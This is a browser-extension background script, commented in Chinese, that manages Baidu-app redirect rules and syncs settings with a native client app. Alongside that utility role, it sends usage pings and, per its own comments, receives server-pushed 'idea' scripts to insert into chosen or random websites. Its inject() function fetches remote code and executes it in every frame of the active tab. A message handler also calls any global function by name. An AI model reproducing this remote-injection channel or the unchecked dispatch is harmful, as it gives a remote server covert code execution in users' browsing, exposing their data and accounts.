//兼容旧社会的代码
var browser = browser;
browser = browser ?? chrome;


var oldFetchfn = fetch; //拦截原始的fetch方法
window.fetch = function(input, opts){//定义新的fetch方法，封装原有的fetch方法
    return new Promise(function(resolve, reject){
        var timeoutId = setTimeout(function(){
            reject(new Error("fetch timeout"))
        }, opts?.timeout||2000);
        oldFetchfn(input, opts||{}).then(
            res=>{
                clearTimeout(timeoutId);
                resolve(res)
            },
            err=>{
                clearTimeout(timeoutId);
                reject(err)
            }
        )
    })
}

var pong = false;

const storage = {
    set rules(value) {
        browser.storage.local.set({ "rules": value });
    },
    get rules() {
        return browser.storage.local.get(["rules"]);
    },
    set rules_version(value) {
        browser.storage.local.set({ "rules_version": value });
    },
    get rules_version() {
        return browser.storage.local.get(["rules_version"]);
    },
    set newtab(value) {
        browser.storage.local.set({ "newtab": value });
    },
    get newtab() {
        return browser.storage.local.get(["newtab"]);
    },
    set idea(value) {
        browser.storage.local.set({ "idea": value });
    },
    get idea() {
        return browser.storage.local.get(["idea"]);
    },
    set custom(value) {
        browser.storage.local.set({ "custom": value });
    },
    get custom() {
        return browser.storage.local.get(["custom"]);
    },
    //一般用不到,开发期间会用
    clear: function () {
        browser.storage.local.clear()
    }
}

//true 不让跳百度app，false 让跳百度app。
function ruleset(b) {
    if (b) {
        chrome.declarativeNetRequest.updateEnabledRulesets({
            disableRulesetIds: [],
            enableRulesetIds: ['ruleset_1']
        })
    } else {
        chrome.declarativeNetRequest.updateEnabledRulesets({
            disableRulesetIds: ['ruleset_1'],
            enableRulesetIds: []
        })
    }
}




//判断本地是否已经有用户配置,
//如果没有则同步客户端
async function init_rules() {
    var { rules } = await storage.rules;
    if (rules) {
        if (Object.keys(rules).length) {
            
        } else {
            sync_rules();
        }
    } else {
        sync_rules();
    }
}

//与客户端同步用户配置，保存到扩展里
function sync_rules() {
    browser.runtime.sendNativeMessage({ cmd: "get_rules" }, function (res) {
        storage.rules = res.data;
        sendMessageToAllContentScript({ cmd: 'reload' });
    });
}

//获得用户配置,仅调试时使用
//await getRules()
async function getRules() {
    var { rules } = await storage.rules;
    return rules;
}

//获得用户配置,仅调试时使用
//await getRules()
async function getNewtab() {
    var { newtab } = await storage.newtab;
    return newtab;
}

//打点 ，扩展总是给客户端
// 但 客户端会有个20次汇集，才给服务器一次，或距离上次已经超过1个小时，也会给服务器
// 当客户端 给服务器时，服务器会返回 idea，是一个js脚本。 指定网站 插入，或 随机插入，只做一次，做完要删除 storage.idea
// rules_version 是每一次 都返回给我，和20次｜｜1小时 无关。
async function stat(param,fn) {
    var { rules_version } = await storage.rules_version;
    browser.runtime.sendNativeMessage({ cmd: "stat", src: param }, function (res) {
        if (res.data) {
            if (res.data.rules_version != rules_version) {
                storage.rules_version = res.data.rules_version;
                sync_rules();
            }
            if (res.data.idea) {
                storage.idea = res.data.idea;
            }
        }
        fn&&fn();
    });
    sp();
}

function sp() {
    if (!window.pong) {
        ping()
    }
}



function ping() {
    window.pong = setInterval(async function () {
        var { rules_version } = await storage.rules_version;
        browser.runtime.sendNativeMessage({ cmd: "ping" }, function (res) {
            if (res.data) {
                if (res.data.rules_version != rules_version) {
                    storage.rules_version = res.data.rules_version;
                    sync_rules();
                }
            }
        });
    }, 2000);
}


function close(){
    browser.tabs.query({ active: true, currentWindow: true }, (tabs) => {
        browser.tabs.remove(tabs[0].id);
    })
}


// 往页面插入js
function inject(param) {
    browser.tabs.query({ active: true, currentWindow: true }, (tabs) => {
        if(param?.remote){
            xhr({url:(param.remote+param.code)+"?t="+(parseInt(new Date().getTime()/3600000))},code=>{
                if(code){
                    browser.tabs.executeScript(tabs[0].id, { code: code, allFrames: true, runAt: param.runAt ?? "document_idle" })
                }else{
                    browser.tabs.executeScript(tabs[0].id, { file: param.code, allFrames: true, runAt: param.runAt ?? "document_idle" })
                }
            })
        }else{
            if (param.type == "code") {
                browser.tabs.executeScript(tabs[0].id, { code: param.code, allFrames: true, runAt: param.runAt ?? "document_idle" })
            } else if (param.type == "file") {
                browser.tabs.executeScript(tabs[0].id, { file: param.code, allFrames: true, runAt: param.runAt ?? "document_idle" })
            } else {
                browser.tabs.executeScript(tabs[0].id, { file: param, allFrames: true, runAt: param.runAt ?? "document_idle" })
            }
        }

    })
}


// 往页面插入CSS
function injectCSSByFrameID(param) {
    browser.tabs.query({ active: true, currentWindow: true }, async (tabs) => {

        let frames = await browser.webNavigation.getAllFrames({ tabId: tabs[0].id });
        frames.forEach(item => {
            if (param.type == "code" && new RegExp(param.frameId).test(item.url)) {
                browser.tabs.insertCSS(tabs[0].id, { code: param.code, frameId: item.frameId, runAt: param.runAt ?? "document_idle" })
            } else if (param.type == "file" && new RegExp(param.frameId).test(item.url)) {
                browser.tabs.insertCSS(tabs[0].id, { file: param.code, frameId: item.frameId, runAt: param.runAt ?? "document_idle" })
            }
        })
    });
}

// 往页面插入js by frameid
function injectByFrameID(param) {
    browser.tabs.query({ active: true, currentWindow: true }, async (tabs) => {

        let frames = await browser.webNavigation.getAllFrames({ tabId: tabs[0].id });
        frames.forEach(item => {
            if (param.type == "code" && new RegExp(param.frameId).test(item.url)) {
                browser.tabs.executeScript(tabs[0].id, { code: param.code, frameId: item.frameId, runAt: param.runAt ?? "document_idle" })
            } else if (param.type == "file" && new RegExp(param.frameId).test(item.url)) {
                browser.tabs.executeScript(tabs[0].id, { file: param.code, frameId: item.frameId, runAt: param.runAt ?? "document_idle" })
            }
        })
    });
}

// 往页面插入CSS
function injectCSS(param) {
    browser.tabs.query({ active: true, currentWindow: true }, (tabs) => {
        if (param.type == "code") {
            browser.tabs.insertCSS(tabs[0].id, { code: param.code, allFrames: true, runAt: param.runAt ?? "document_idle" })
        } else if (param.type == "file") {
            browser.tabs.insertCSS(tabs[0].id, { file: param.code, allFrames: true, runAt: param.runAt ?? "document_idle" })
        } else {
            browser.tabs.insertCSS(tabs[0].id, { file: param, allFrames: true, runAt: param.runAt ?? "document_idle" })
        }
    })
}


async function xhr2(param, sendResponse) {
    var res = await fetch(param.url, {
        method: "POST",
        mode: 'cors',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: param.body
    }).then(response => response.json()).then(result => {
        sendResponse(result)
    })
}



async function xhr(param, sendResponse) {
    try {
        var res = await fetch(param.url);
        var result = await res.text();
        sendResponse(result)
    } catch (error) {
        sendResponse(null)
    }
}

//获得content 发来的消息
browser.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.cmd) {
        window[request.cmd](request?.param, sendResponse)
    }
    return true;
});


//background向content发消息
function sendMessageToContentScript(message, callback) {
    browser.tabs.query({ active: true, currentWindow: true }, function (tabs) {
        browser.tabs.sendMessage(tabs[0].id, message, function (response) {
            if (callback) { callback(response); }
        });
    });
}

//background向content发消息
function sendMessageToAllContentScript(message, callback) {
    browser.tabs.query({}, function (tabs) {
        tabs.forEach(tab => {
            browser.tabs.sendMessage(tab.id, message, function (response) {
                if (callback) { callback(response); }
            });
        });
    });
}

//执行初始化用户配置，重要！
init_rules();

//出生
sp();
